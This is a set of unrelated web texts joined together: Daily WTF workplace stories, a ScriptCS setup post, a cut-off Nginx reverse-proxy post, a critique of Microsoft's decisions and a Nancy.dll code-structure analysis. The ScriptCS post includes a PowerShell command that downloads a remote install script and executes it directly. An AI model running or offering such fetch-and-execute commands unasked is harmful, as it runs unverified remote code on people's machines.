I’m already a‘you guy?’”</p><p>Bob laughed disarmingly.“We built the network it’s installed on. It makes total sense.”</p><p>“You’re not running up against our non-compete?” Peter asked.</p><p>“No, man. We’re‘consultants’ now- totally different gig.” Bob turned back to add in a whisper,“and making<i>twice</i>the money! Lunch is on an expense account, by the way. Want to come to the steakhouse with us?”</p><p>Peter couldn’t fault Bob, especially not in the age when most employers discarded entire divisions like empty bottles of Evian. Still, in a way Peter felt like<i>he</i>was being left to sink or swim, not the company.</p><p>“Who came up with this idea?” he couldn’t help asking.“You or them?”</p><p>Bob sighed and looked down at Peter, in more senses than one.“Look, it’s not important. Hang in there, man. Maybe one of these days, you’ll get to do the same thing.”</p><p>Instead of developing in-house— too expensive— Peter’s company had contracted ConsultPro to implement a SharePoint core to unify dozens of their business applications. The project had lasted over a year, long enough for facades to melt away. The “strategic partnership” morphed from a collaboration of equals to a nimble parasite feeding off a dim- and slow-witted host. Not only was ConsultPro raking in monstrous hourly fees for its “specialized expertise,” it was also poaching three of the company’s engineers.</p><p>Peter wasn’t bitter. His chief responsibility lay in network account administration, so it wasn’t surprising that ConsultPro hadn’t come at him with the magical Wand of Consultant. However, there would be lots of knowledge transfer and shared responsibility until replacements arrived, cutting into all the work the department already had to do. Peter was also backup support for ConsultPro’s new solution, and had to familiarize himself with its underpinnings. He read up on documentation, played in the test environment, and handled the smaller tasks that primary support didn’t have time for. Meanwhile, Bob and his cohorts ascended to the land where money hemorrhaged upon those who dressed the most basic observations in the fanciest terms amid the swankest soirees.</p><p>The new system had some minor hiccups, as new systems do. It went live, and users acclimated. All went well for several months. Management toasted themselves for hiring outside help and reducing the Engineering budget, freeing up company resources to better focus on core strategies— like management bonuses. Perhaps the company didn’t need so many developers and support reps after all—</p><p>—and then, a major crash paralyzed everything. No one could log into the SharePoint portal. Thousands of users lost access to the apps they needed to do business. Peter’s CEO placed a frantic call to ConsultPro. Within an hour, Bob and the other two poached engineers returned to their former workplace and secreted themselves away in the biggest conference room on Peter’s floor.</p><p>Peter wasn’t primarily responsible, but decided to drop in on Bob and his old coworkers.“Hey! How’s it going?”</p><p>“Hi.” None of them managed more than that. A tension normally reserved for bomb disarmament choked the air out of the room.</p><p>“Um…” Peter grasped for something to say.“Anything I can help with?”</p><p>Bob ran a hand over his thinning hair, sighing and muttering.“It’s been two hours and we haven’t figured this out. You better clear out of here. It’s really complex, we’d probably bore you.”</p><p>Peter peered over Bob’s shoulder, at the error message on his laptop.“It could be that the security log’s full. Have you checked the application’s internal registry?”</p><p>The consultants in the room glanced up with a shot, questioning looks on their faces.</p><p>Peter walked Bob to the proper registry key.“This should be a 1, not a 4. It does that when the security log is full and has failed to be cleared and saved properly. Run the script<code>save-and-empty-seclog</code>, that should take care of it.”</p><p>Stunned, Bob nevertheless complied. Within minutes, everything was up and running again.</p><p>“How did you know that?” one of the other consultants asked, astonished.</p><p>“It’s in the documentation,” Peter said.“The same documentation<i>you</i>released to<i>us</i>. So this is why you get twice the pay I get?”</p><p>Peter shrugged, and left before any of them replied.</p><div style=\"margin:10px;padding:5px;background-color:#eee;\"><div style=\"min-height:45px\"><img src=\"http://thedailywtf.com/tizes/ads/inedo40x40.png\" style=\"display:block;float:left;margin-right:4px;\">[Advertisement]<b>Make your team a DevOps team with<a href=\"http://inedo.com/?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">BuildMaster</a></b>.

When the owner, an old man named Brad, had offered her a position after spotting her in a student computer lab, she thought he was crazy, but a background check confirmed everything he said. Now she wondered if her first intuition was correct.</p><p>“Anita, welcome!” Brad seemed to bounce like a toddler as he showed Anita inside. The walls of the converted garage were bare drywall; the wall-mounted AC unit rattled and spat in the corner. In three corners of the office sat discount computer desks. Walls partitioned off Brad’s office in the fourth corner.</p><p>He practically shoved Anita into an unoccupied desk. The computer seemed to be running an unlicensed version of Windows 8, with no Office applications of any kind. “Ross can fill you in!” He left the office, slamming the door shut behind him.</p><p>“Hi.” Ross rolled in his chair from his desk to Anita’s. “Brad’s a little enthusiastic sometimes.”</p><p>“I noticed. Uh, he never told me what game we’re working on, or what platform. Not even a title.”</p><p>Ross’s voice lowered to a whisper. “None of us know, either. We’ve been coding in Unity for now. He hired you as a programmer, right? Well, right now we just need someone to manage our documentation. I suggest you prepare yourself.”</p><p>Ross led Anita into Brad’s office. Above a cluttered desk hung a sagging whiteboard. Every square inch was covered by one, sometimes several, overlapping sticky notes. Each had a word or two written in Brad’s scrawl.</p><p>“We need more than just random post-its with ‘big guns!’ and ‘more action!’” Ross said. “We don’t even know what the title is! We’re going crazy without some kind of direction.”</p><p>Anita stared at the wall of sticky notes, feeling her sanity slipping from her mind like a wet noodle. “I’ll try.”</p><h3>Sticky Escalation</h3><blockquote><pre>Brad, can we switch to Word for our documentation? It’s getting harderto read your handwriting, and there’s a lot of post-its that havenothing to do with the game. This will make it easier to proceed withdevelopment. -Anita</pre></blockquote><p>Two minutes after she sent the email, Brad barged out of his office. “Anita, why spend thousands of dollars on software licenses when this works just fine? If you can’t do your job with the tools you have, what kind of a programmer does that make you?”</p><p>“Brad, this isn’t going to work forever. Your whiteboard is almost out of room, and you won’t take down any of your non-game stickies!”</p><p>“I can’t take any of them down, Anita! Any of them!” He slammed the door to his office behind him.</p><p>The next day, Anita was greeted at the door by the enthusiastic Brad she had met before the interview. “I listened to reason, Anita. I hope this is enough for you to finish this documentation and get coding again!”</p><p>Brad led Anita into his office. On every wall surface, over the door, even covering part of the floor, were whiteboards. Sticky notes dotted nearly a third of the new whiteboard space.</p><p>“Now, Anita, if I don’t see new code from you soon, I may just have to let you go! Now get to work!”</p><p>Anita went to sit at her desk, then stopped. Instead, she grabbed a bright red sticky note, wrote the words “I QUIT” with a sharpy, barged into Brad’s office, and stuck it to his monitor. Brad was too stunned to talk as she left the converted garage.</p><h3>The Avalanche</h3><p>“Are you doing better?” Jason called Anita a few weeks later. Their short time together at GES has made them comrades-in-arms, and networking was crucial in the business.</p><p>“Much,” she said. “I got a real job with an indie developer in Santa Monica. We even have a wiki for our framework!”</p><p>“Well, listen to this. The day after you quit, the AC unit in the garage broke. I came into work to see Brad crying in a corner in his office. All of the sticky notes had curled in the humidity and fallen to the floor. The day after he got us all copies of Word.</p><p>“Too bad we still don’t know what the title of the game is.”</p><div style=\"margin:10px;padding:5px;background-color:#eee;\"><div style=\"min-height:45px\"><img src=\"http://thedailywtf.com/tizes/ads/inedo40x40.png\" style=\"display:block;float:left;margin-right:4px;\">[Advertisement]<b>Make your team a DevOps team with<a href=\"http://inedo.com/?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">BuildMaster</a></b>.

He had been an annual visitor to Comicon for the past decade, but when they ran into trouble with the audio right before the \"Big Bang Theory\" cast panel, he just happened to be the right person in the right place at the right time. Working furiously to get the cabling back together, he was surprised the gentle tap on his shoulder. Turning around, he found himself face-to-face with Kaley Cuoco.</p><p>\"Thanks soooo much for your help\", she cooed.</p><p>\"N-N-No problem\", Eric stuttered. \"Happy to be able to help out\"</p><p>Turning back to the console, Eric refocused. Was that a hand he still felt resting lightly on his back?</p><p>And that faint music. Getting lounder. It was almost...no, it<strong>was</strong>the sound of the Barenaked Ladiea.</p><p>Groggily, Eric rolled over in his bed and reached for the cell phone that was ringing on the night stand.</p><p>\"Yeah?\"</p><p>\"Eric, it's Trevor. We've been running into a problem since that patch to the exporting program was put in over the weekend. It has been slowly getting worse over the weekend, but now that Europe is starting to come on-line, it's become an emergency.\"</p><p>An emergency, thought Eric? Yeah, sure. Then why wasn't it an emergency yesterday evening.</p><p>Still Eric went over to his desk, flipped on his computer and started digging. Naturally, the first place to look was where stuff had just been changed.</p><p>When not saving geek conferences, Eric worked for a phone company that keeps custom audio from their customers in giant wave files. And for him, 'giant' meant around 200-700MB. These wave files contained custom prompts created by their customers in an audio format. Associated with each of these wave files is a text file containing metadata about the number and content of the prompts encoded in the audio format.</p><p>When a wave file was imported into the application, it would break the wave file into a large number of 20MB chunks. These chunks were easier to manage (not to mention being able to ZIP up and send around by email, if needed). The file names related to these chunks were included in the text-based metadata. On export, the metadata file would be read, the chunks located and put back together into one big file.</p><p>However, thanks to a change in the export process, the 'de-chunkifying' was taking much longer than before. When one told the program to export, it would hang for about eight seconds, and then pop up a progress bar and chug away for about four more seconds. And the only change seemed to be the addition of that progress bar. Putting aside the WTF-ness of waiting two-thirds of the way into a process to even start the progress bar, the timing seemed odd to Eric.</p><p>Seeing no other significant modifications, Eric drilled into the code surrounding the progress bar. The import was split into three steps.  First it loads the audio metadata from the text file. Next it uses a function to check the total sizes of the audio 'chunks' (to more accurately inform the user of the progress). Finally, the progress bar was displayed and the exported file created.  Thinking it was strange that the first two parts took 8 seconds while the real work took only four, Eric went further into the code.</p><p>What he saw was that the time before the progress bar was spent almost entirely in the function checking the file sizes. Now knowing where to look, Eric quickly scanned through the file sizing code. As it turns out, rather than measuring the file size, it was measuring the audio size. Which required it to open, read, and process the header of each and every 20MB wave file.</p><p>Given the criticalness of the accuracy of the progress bar (yes, he was familiar with how precise Microsoft always got with their progress indicators), Eric altered the progress bar procedure to use the number of chunks in the text file rather than the combined size of the audio chunks as it's metric. All of a sudden, the progress bar was almost instantaneously available and the entire exporting process took 4 seconds. Looking a little further into the code, he discovered that the updates to the progress bar were being made with ever 200B read from the file. By increasing that to 4MB he cut another 3 seconds off the process. Yes, yes the cost was less accuracy. Sue him.</p><p>Eric pushed the changes into the master branch and relaxed back into his chair while waiting for the build to run.</p><p>\"Oh Eric,\", said Kaley as she leaned closer, \"you're soooo awesome.\" The kiss was soft and moist.</p><p>The ping of an incoming notification brought Eric back to consciousness. And the only blonde in sight was the cocker spaniel licking drool off of his face.</p><div style=\"margin:10px;padding:5px;background-color:#eee;\"><div style=\"min-height:45px\"><img src=\"http://thedailywtf.com/tizes/ads/inedo40x40.png\" style=\"display:block;float:left;margin-right:4px;\">[Advertisement]<b>Make your team a DevOps team with<a href=\"http://inedo.com/?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">BuildMaster</a></b>.

They both shared in the support and maintenance of a monstrous in-house spawned order processing / network monitoring / invoice printing / slashy / slash / slash system written in Visual C++. However, while Pete kept up in the latest technology trends and was always on the lookout for new solutions to old problems, Dick was a very conservative manager with twenty-five company years under his belt. To Dick,\"change\" was only a Good Thing when it added up to 65¢, which was the exact amount required to buy a ginger ale from the soda machine. What kept Pete and Dick from being a perfect couple was that Dick was Pete's supervisor and often times, he got his way.</p><p style=\"margin-top: 0px\">Back in the late-90's, Pete had caught wind of some\"Java\" thing starting to pick up steam. When comparing features, he found that many of the kludgy, half-hearted attempts at a supportable solution they developed would have been scads easier to do using Java. Intrigued at the prospect of a better codebase that took less to develop, Pete coded up a new modules in Java as a proof of concept. For a prototype, it seemed to work well. That is, until it hit a roadblock named Dick. You see, Dick had heard about Java, too.</p><p>\"You're a developer, not a hacker,\" Dick ranted after being shown the Java prototype,\"we already have the right tools for the job at our hands. Anything that must be run as bytecode through a<em>virtual</em>machine will always be ten times slower!\"</p><h3 style=\"margin-bottom: 0px\">Order Jamming</h3><p style=\"margin-top: 0px\">As the years past by, Dick continued to have misgivings about Java. Whenever someone said the word\"Java\", his knee-jerk reaction was<em>*cough*virtualmachine*cough*</em>. As developers from other teams began using Java tools for themselves, he'd shake his head, roll his eyes back, and eagerly await the first opportunity to say\"told you so\" if anything unexpected occurred. Even something as little as a typo.</p><p style=\"margin-top: 0px\">Not all Java encounters, however, ended with just an eyeroll. One day, after being impacted by a\"major Java failure\" in another department's application, Dick dished out some full-fledged, beat-in-the-face, you'll-be-lucky-if-you-have-a-job-in-the-mailroom-once-I'm-through-with-you anger to one of the lead developer in the other group. And for good reason: the application in question was a J2EE-based order processing system that used Oracle databases and Enterprise Java Beans. That fell directly into the crosshairs of Dick's anti-Java artillery.</p><p style=\"margin-top: 0px\">Curious as to the technical details of the failure, Pete inquired with the developer. The problem, as he explained, occurred in the middle of a seasonal heavy volume period where the number of orders per second peaked into the hundreds. During that time, it took several minutes to complete a transaction, making the performance comparable to that of a crusty old 486. Dick had of predictably blamed Java.</p><p style=\"margin-top: 0px\">\"Had it always buckled under the pressure?\" Pete asked.</p><p style=\"margin-top: 0px\">\"No,\" replied the colleague,\"we're on Version 3 of the system; it's not like they had gained thousands of customers overnight.\"</p><p style=\"margin-top: 0px\">\"So what happened recently to make things so bad?\" asked Pete.</p><p style=\"margin-top: 0px\">\"Dick happened.\"</p><p style=\"margin-top: 0px\">Previously, the system had used a message queue system to pass data between it and the big server in the Financials group. However, now, every single transaction was saved off to a custom table in the database, dumped to a common directory on Unix, and then were transferred out by a cron job via FTP. Pete asked why on earth they were writing the transactions to text files.</p><p style=\"margin-top: 0px\">\"That's most likely what's slowing the whole thing down so much,\" the developer explained.\"Dick insisted that, if we were to interface with your system, then we'd have to write everything to text files for reliability. He likes to have the data around where he can see it. To the best that we can tell, he just didn't trust the whole Java and database thing.\"</p><p style=\"margin-top: 0px\">Though\"Javagate\" didn't have the outcome that Dick had hoped— having the mature order processing system be scrapped in favor of something a little lower in the alphabet than\"J\"— he still remained bitter about technology.</p><h3 style=\"margin-bottom: 0px\">A Sure Thing!</h3><p style=\"margin-top: 0px\">Because of ACME's expertise in building specialized logistical software, a Norwegian company named FooNorsk sent some suit n' tie guys to probe ACME for a really big thing: they had just won a government contract to automate the transportation of passengers around the whole country and wanted ACME to develop some parts of the system.</p><p>The system would be responsible for tracking all the vehicles (trains, buses and boats) using GPS, automatically planning all the schedules, coordinating different transportation systems, solving problems due to service interruptions, delays, etc. It was slated to be installed in a big server farm near Oslo and require hundreds of servers to run. Oh, and it was to be based in J2EE.</p><p style=\"margin-top: 0px\">Pete and Dick attended some meetings with the tall, Viking-looking guys. In a break for coffee, Pete was talking with FooNorsk's main engineer about how ACME had done plenty of Java based projects and had so much expertise in the subject.</p><p style=\"margin-top: 0px\">When the meeting resumed, the discussion went about some more technical details. Dick then sealed the fate of the meeting with these killer sentences:</p><p style=\"margin-top: 0px\">\"So, your system is made in Java? We don't use any Java around here, it's just too slow. It has no use in our line of business.

When a family member's health began to fail, they were able to sell their software business and retire to help him manage. In their forties, their good fortune and low-key lifestyle meant they wouldn't have to return to work unless they wanted to.</p><p>After a couple of years, things had settled into a routine and Dave was ready to consider new opportunities. A local startup was courting him for a senior position, and their engineering team, relatively young and untested, seemed excited to have a steady hand at the tiller. But this startup was unusual: no hiring decision could be made on nautical metaphors alone. They - specifically, their overlords at WTF Ventures, Inc. - prided themselves on fusing the discipline and professionalism of the corporate world to the innovation and foosball-playing of startup culture.</p><p>That fusion is what put Dave across a boardroom table from Regina, the Head of HR, explaining why he had no \"Education\" section on his résumé.</p><p>\"I went to college briefly in the late 'eighties,\" Dave said, \"but dropped out with my business partner to start our first consulting company.\" Regina raised her eyebrows, so Dave continued. \"I suppose I left<em>some college</em>off my résumé to make room for the subsequent twenty-five years of experience...\"</p><p>\"Hmm. But don't you feel unfulfilled?\" Regina said.</p><p>\"Unfulfilled?\" Dave blinked. \"Well...  no. Fortunate, lucky,<em>free</em>.\" He counted the adjectives off on his fingers. \"I feel a lot of things, but not unfulfilled.\"</p><p>Regina raised her eyebrows again, so, once more, Dave elaborated. \"I'm forty-five, and you're trying to lure me out of<em>retirement</em>to run engineering at a startup. I feel pretty fulfilled.\"</p><p>\"Oh,\" Regina said. \"We'll need an affidavit of education.\"</p><p>\"A<em>what?</em>\" Dave had to compose himself. \"Pardon me. I'm not claiming to<em>have</em>any education. I'm sorry, I don't quite understand what you'd need an affidavit for...?\"</p><p>\"We're seeing a lot of fraud around claimed but unearned academic credentials,\" Regina said. Now it was Dave's turn to silently prompt her to continue. \"You know: people with a Bachelor's claiming to be doctoral graduates. We need to see an affidavit.\"</p><p>Dave toyed with what it would take to get his<em>almost-mater</em>to certify that he had, in fact, attended two full years of undergraduate Computer Engineering. He couldn't even remember if he'd started in the 1986-87 academic year or what his cumulative GPA had been.</p><p>Regina took his silence as an opportunity to lean forward and add, \"The affidavit<em>must</em>be notarized, of course.\"</p><p>\"This all seems a little backwards,\" Dave said. Regina raised her- you get the idea. \"I'm not sure what you want an affidavit from me to substantiate: that I don't secretly have an advanced degree in nuclear engineering? That I'm not lying to you now to cover up my possession of a tenured professorship?\"</p><p>\"Sorry, but that's our policy. We don't want to take a chance on<em>anyone</em>claiming educational accolades they never<em>actually</em>received.\" Regina passed his résumé - tagged<em>EDUCATION???</em>in bold red marker at the bottom â€” back across the table. \"You'll need a<em>notarized</em>affidavit stating your true level of education.\"</p><p>Dave opted to withdraw his application instead. After careful consideration, he determined that the life of an early-retiree was more commensurate with his academic achievements.</p><div style=\"margin:10px;padding:5px;background-color:#eee;\"><div style=\"min-height:45px\"><img src=\"http://thedailywtf.com/tizes/ads/inedo40x40.png\" style=\"display:block;float:left;margin-right:4px;\">[Advertisement]<b>Make your team a DevOps team with<a href=\"http://inedo.com/?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">BuildMaster</a></b>.

As you may know by now, I’ve been searching for <a href=\"http://elegantcode.com/2012/11/30/visual-studio-light-edition/\" target=\"_blank\">a more lightweight .NET development experience</a> for quite some time. The ScriptCS project is here to fulfill this desperate need. Driven by <a href=\"https://github.com/scriptcs/scriptcs/wiki/Contributors\" target=\"_blank\">the open-source .NET community</a>, this wonderful initiative promises to unleash C# from Visual Studio which is exactly what I’ve been looking for.</p></p><p align=\"justify\">Being heavily inspired by the <a href=\"http://nodejs.org/\" target=\"_blank\">node.js</a> development workflow, ScriptCS is built on top of <a href=\"http://msdn.microsoft.com/en-us/vstudio/roslyn.aspx\" target=\"_blank\">Roslyn</a> and makes heavy use of NuGet for installing packages and <a href=\"https://github.com/scriptcs/scriptcs/wiki/Script-Packs-master-list\" target=\"_blank\">script packs</a>. You can get up and running in no time by installing ScriptCS using <a href=\"http://chocolatey.org/\" target=\"_blank\">Chocolatey</a>. If you didn’t have Chocolatey installed already (like me), then it can be easily done by running the following Powershell command:</p><blockquote><p align=\"justify\"><em>@powershell -NoProfile -ExecutionPolicy Unrestricted -Command \"iex ((New-Object Net.WebClient).DownloadString(‘</em><a href=\"https://chocolatey.org/install.ps1'))\"\"><em>https://chocolatey.org/install.ps1′))\"</em></a><em> && SET PATH=%PATH%;%systemdrive%\\chocolatey\\bin</em> </p></blockquote><p align=\"justify\">Now we can install ScriptCS by simply running the following command:</p><blockquote><p align=\"justify\"><em>cinst scriptcs</em></p></blockquote><p align=\"justify\">That’s all we need! </p><p align=\"justify\">Now in order to do something useful with it, we can clone the samples repository to our dev machine and try to run the <a href=\"http://nancyfx.org/\" target=\"_blank\">Nancy</a> sample application. Navigate to the <em>Nancy</em> folder in a command prompt and run the command <em>“scriptcs -install”</em> to install all package dependencies defined in the <em>packages.config</em> file. Next run the following command to start the web application:</p><p align=\"justify\"><a href=\"http://elegantcode.com/wp-content/uploads/2013/05/image1.png\"><img title=\"image\" style=\"border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px; display: inline\" border=\"0\" alt=\"image\" src=\"http://elegantcode.com/wp-content/uploads/2013/05/image_thumb.png\" width=\"409\" height=\"77\" /></a> </p><p align=\"justify\">Now open up your favorite browser, navigate to <a href=\"http://localhost:1234\">http://localhost:1234</a> and <em>et voilà</em>:</p><p align=\"justify\"><a href=\"http://elegantcode.com/wp-content/uploads/2013/05/image2.png\"><img title=\"image\" style=\"border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px; display: inline\" border=\"0\" alt=\"image\" src=\"http://elegantcode.com/wp-content/uploads/2013/05/image_thumb1.png\" width=\"409\" height=\"368\" /></a> </p><p align=\"justify\">Amazing isn’t it? </p><p align=\"justify\">I do recognize that the project is still very much a work in progress. Also something that’s not entirely clear for me is the deployment story. The road map mentions some kind of export functionality to an .exe or a Visual Studio Project. In any case, there should be an easy way to convert the code files into binary form. </p><p align=\"justify\">Something that I also would love to see is support for <a href=\"http://www.mono-project.com/Main_Page\" target=\"_blank\">Mono</a>. How cool would it be to develop and run C# code using ScriptCS on Mac and Linux?</p><p align=\"justify\">The future for ScriptCS certainly looks bright and I’m very much looking forward to where <a href=\"https://github.com/scriptcs/scriptcs/wiki/Goals-and-Roadmap\">this particular road</a> is taking the .NET universe. Take a look at the <a href=\"https://github.com/scriptcs/scriptcs/wiki\">wiki </a> and start familiarize yourself with ScriptCS as it’s going to open up very interesting opportunities for future .NET development.</p><p align=\"justify\">Until next time.</p>","author":"Jan Van Ryswyck","_id":{"$wrap":"$oid","v":955}}

On my current project we’ve building a distributed service oriented architecture that also exposes an HTTP API, and we’re using a reverse proxy to route requests addressed to our API to individual components. We have chosen the excellent<a href=\"http://wiki.nginx.org/Main\">Nginx</a>web server to serve as our reverse proxy; it’s fast, reliable and easy to configure. We use it to aggregate multiple services exposing HTTP APIs into a single URL space. So, for example, when you type:</p><p><a href=\"http://api.example.com/product/pinstripe_suit\">http://api.example.com/product/pinstripe_suit</a></p><p>It gets routed to:</p><p><a href=\"http://10.0.1.101:8001/product/pinstripe_suit\">http://10.0.1.101:8001/product/pinstripe_suit</a></p><p>But when you go to:</p><p><a href=\"http://api.example.com/customer/103474783\">http://api.example.com/customer/103474783</a></p><p>It gets routed to</p><p><a href=\"http://10.0.1.104:8003/customer/103474783\">http://10.0.1.104:8003/customer/103474783</a></p><p>To the consumer of the API it appears that they are exploring a single URL space (<a href=\"http://api.example.com/blah/blah\">http://api.example.com/blah/blah</a>), but behind the scenes the different top level segments of the URL route to different back end servers. /product/… routes to 10.0.1.101:8001, but /customer/… routes to 10.0.1.104:8003.</p><p>We also want this to be self-configuring. So, say I want to create a new component of the system that records stock levels. Rather than extending an existing component, I want to be able to write a stand-alone executable or service that exposes an HTTP endpoint, have it be automatically deployed to one of the hosts in my cloud infrastructure, and have Nginx automatically route requests addressed<a href=\"http://api.example.com/stock/whatever\">http://api.example.com/stock/whatever</a>to my new component.</p><p>We also want to load balance these back end services. We might want to deploy several instances of our new stock API and have Nginx automatically round robin between them.</p><p>We call each top level segment ( /stock, /product, /customer ) a<em>claim.</em>A component publishes an ‘AddApiClaim’ message over RabbitMQ when it comes on line. This message has 3 fields: ‘Claim', ‘ipAddress’, and ‘PortNumber’. We have a special component, ProxyAutomation, that subscribes to these messages and rewrites the Nginx configuration as required. It uses SSH and SCP to log into the Nginx server, transfer the various configuration files, and instruct Nginx to reload its configuration. We use<a href=\"http://mikehadlow.blogspot.co.uk/2013/05/sshnet.html\">the excellent SSH.NET</a>library to automate this.</p><p>A really nice thing about Nginx configuration is wildcard includes. Take a look at our top level configuration file:</p><div id=\"codeSnippetWrapper\"><div id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace;

The company behaves like if a 1% small group of blinded managers took the power of decision and put all its energy in wrecking the work of the 99% others MSFT. Nowadays Microsoft is stressed by Apple, Sony, Google, Facebook … successes and need to take action to survive in the long-term, but this obvious lack of common sense starts to have solid harmful consequences. Here are some of the craziest decisions I took note:</p><ul><li><strong style=\"line-height: 16px\">Windows 8 tiles and suppression of Start menu</strong><span style=\"line-height: 16px\">: This one is a really killer. While Windows 8 tiles make sense on a touch device, while we can forecast that in two years most devices running Windows will come with a touch screen, today 99% of real-world user of Windows 8 hate tiles (this number 99% is my own statistic, just by looking around me the real-world people behavior).  Not only tiles are barely practicable with a mouse, but they also are flat. Just by installing the common set of .NET dev tools and running under Windows 8 for a few months, I get hundreds of tiles randomly organized without any kind of hierarchy. There is no way I’ll take a few hours to try sort them out! I then installed a third-party Start Menu to have my Windows 8 looking like Windows 7. Unfortunately 50% of real world users (again my own statistic) are unable to <em>imagine existence/find/download/install</em>  a third-party Start Menu. The other half of users are totally stuck with their brand new PC fighting to do anything that used to be immediate under previous version of PC. Btw, some PC resellers I know just install by default a third-party Start Menu. I understand that Windows Blue will be released urgently to palliate this huge waste. But while Windows 8 is so much more superior than Windows 7 in many ways, <a href=\"http://www.reuters.com/article/2013/04/10/us-pc-data-idUSBRE93914P20130410\" target=\"_blank\">PCs sales are dropping dramatically</a>. <strong>It would have been so easy</strong> (and as far as I know everybody with a bit of common sense was fighting for that against the 1% managers with plain-power) to: 1) </span><span style=\"font-size: medium\">Propose tiles as the preference only on devices with touching screen 2) </span>Keep the Start Menu anyway.</li></ul><ul><li><strong>XBoxOne waste, even before the release</strong>: Again, some of the 1% manager were so smart that they wanted to make more money by treating gamers like idiots by keeping them captive. An internet connection was mandatory and game sharing was forbidden. Of course <a href=\"http://www.reuters.com/article/2013/06/19/us-microsoft-xbox-idUSBRE95I1MV20130619\" target=\"_blank\">they reverse their positions</a> as soon as Sony jumped on the occasion to claim that PS4 will treat gamers decently, not just like wallet. The result is that the XBoxOne brand is already strongly diminished, while I have no doubt that the XBoxOne is an awesome piece of technology conceived by thousands of ultra-smart engineers, that cost billions of dollars in R&D.</li></ul><ul><li><strong>Visual Studio release schedule</strong>: Again, some of the 1% manager thought that it’d be so cool to start <a href=\"http://blog.protegra.com/2013/06/06/visual-studio-2013/\" target=\"_blank\">releasing a new version of Visual Studio every year</a>. As a consequence VS2013 will be released in the 2013 calendar year, not even 18 months after VS2012 RTM. These guys seem to have no idea about how ISVs using VS are working. My own statistic shows that only a third of companies adopted VS2012, 12 months after RTM. VS2008 and VS2005 still represent more than 10% of VS in productions. And the largest the ISV, the more it tends to take time to upgrade to a new VS version because it takes so much energy and there are plenty of ascendant compatibility constraints around them. Having project/solution compatibility since VS2010, while good, is far from being the only parameter that ISV take account when they decide to upgrade to a new version of VS. Not only a yearly release is not suited for the bulk of users, but certainly this represents a big extra-burden for the developments team behind VS. VS releases are not anymore driven by a vision of what should be the next version, but each VS major version will just contain features that are done by the time limit, with sometime important features to be released immature, or postponed.</li></ul><p>Microsoft is loosing market shares, not because of a lack of good engineered products, but a lack of common sense. I really hope this trend will change because I am starting to worry a bit!</p><p><em>Addendum</em>: Sadly, I receive comments that ‘shoot the messenger’. They take me wrong. All my work for two decades is based on MS technologies and if I am critic today, it is because I am worrying for the future, because I don’t plan to change platform anytime soon. If MS sales numbers were up it’d be just me, but these numbers are collapsing. The web is filled up with ex-enthusiasts complaints on Windows 8 tiles forced on non-touch-devices <a href=\"http://www.forbes.com/sites/adriankingsleyhughes/2013/03/14/why-windows-8-is-the-first-windows-release-i-absolutely-hate/\" target=\"_blank\">(1)</a> <a href=\"http://www.fool.com/investing/general/2013/06/02/what-to-expect-from-microsofts-next-windows-releas.aspx\" target=\"_blank\">(2)</a> <a href=\"http://www.dailykos.com/story/2013/01/15/1179238/-Why-I-hate-Windows-8\" target=\"_blank\">(3)</a>…  Here I report how drastic decisions can ruin the great work of thousands of engineers. Windows 8 is awesome, especially when it comes to performances gain + it works on different devices. But the transition between Windows 8 and Windows 7 <strong>should</strong> have been smoother concerning classic PCs users, especially by making the Start Menu cohabits with Tiles. Non technology enthusiasts (i.e the bulk of Windows users) are just lost. A wrong decision has been taken here despite the tsunami of pre-RTM complaints, and <strong>my point is about how common-sense has been discarded in decisional process</strong>, in the various cases I am mentioning.</p><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/GFR5MPEArHQ\" height=\"1\" width=\"1\"/>","author":"Patrick Smacchia","_id":{"$wrap":"$oid","v":991}}

After a recompilation, I can count 56 occurences of Nancy.dll that weights 842 KB each, it means more than 46MB wasted. Apparently it doesn’t affect so much the VS compilation duration, I guess the VS team made VS 2012 more intelligent in the sense that if it has already parsed a reference assembly for a project, it doesn’t parse it for others, which is a good thing.</p><p><a href=\"http://codebetter.com/patricksmacchia/files/2013/05/NancyDuplication.jpg\"><img class=\"alignnone size-full wp-image-829\" alt=\"NancyDuplication\" src=\"http://codebetter.com/patricksmacchia/files/2013/05/NancyDuplication.jpg\" width=\"600\" height=\"559\" /></a></p><p>I tried to post something on the <a href=\"https://groups.google.com/forum/#!forum/nancy-web-framework\" target=\"_blank\">Nancy user group</a>, without success, hence this post. To fix this issue, it is as simple as:</p><ul><li>making sure that each project compile in a <em>..\\bin\\Debug</em> and <em>..\\bin\\Release</em> folder</li><li>from VS projects, reference the DLLs in the <em>..\\bin\\Debug</em> directory, and set<em> CopyLocal = false</em> for each reference</li></ul><p>Additional, I found <em>..\\bin</em> to be a good folder to host test assemblies.

It is made of the 287 Nancy.dll classes, in mode indirect dependency. A blue cells means that the class in column depends (directly or indirectly) on the class in row, a green cell means the opposite, and a black cell means that the 2 classes are dependents on each others. A perfectly layered set of classes (which is not wished, but what should be approached) would be a lower triangular matrix blue, and a higher triangular matrix green. Here the matrix has blue and green cells mixed equally in both lower and higher triangulars, which is another way to figured out that classes are not layered.</p><p><a href=\"http://codebetter.com/patricksmacchia/files/2013/05/NancyMatrix.jpg\"><img class=\"alignnone size-full wp-image-832\" alt=\"NancyMatrix\" src=\"http://codebetter.com/patricksmacchia/files/2013/05/NancyMatrix.jpg\" width=\"600\" height=\"533\" /></a></p><p>It means that it must be difficult to unit-test a set of cohesive classes (i.e a component) in isolation from the others (even by using mocks that don’t help in case or re-entrant dependency). It also means that maintenance and evolution must be impaired by this absence of code structure, because touching a single class can virtually have an unexpected effect anywhere in the code base.</p><h2></h2><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/ssp1s-S4sD8\" height=\"1\" width=\"1\"/>","author":"Patrick Smacchia","_id":{"$wrap":"$oid","v":992}}

